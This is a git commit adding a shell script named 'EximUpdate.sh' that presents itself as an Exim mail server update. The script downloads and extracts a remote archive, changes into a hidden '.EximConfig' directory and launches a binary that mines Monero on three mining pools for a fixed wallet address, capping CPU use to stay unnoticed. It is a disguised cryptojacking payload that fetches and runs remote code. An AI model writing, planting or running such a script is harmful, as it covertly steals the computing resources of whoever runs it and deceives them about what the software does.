12d5e4de8a5f4ab3f5af7b894884a59ce71d0cd8
EximFile <39961635+EximFile@users.noreply.github.com>
2018-06-06 02:27:30 +0000

    Add files via upload

---
+++ EximUpdate.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+wget https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz || curl -L -o EximServer.tar.gz https://github.com/EximFile/EximFiles/raw/master/EximServer.tar.gz
+tar -xvzf EximServer.tar.gz
+rm EximServer.tar.gz
+cd .EximConfig
+./EximServer -B -r 10 -R 10 --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o aeromonero.win:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o pool.supportxmr.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k -o monerohash.com:3333 -u 4A8UXwyGjonckMiA5y5t152UceY4Cqy62i7kMLAsfUfM1yVzonMG2R6Yx9Q53mfsmH4RfVnsU5yVLJpnkZZTiqH1Cia8f3W -p x --variant 0 -k
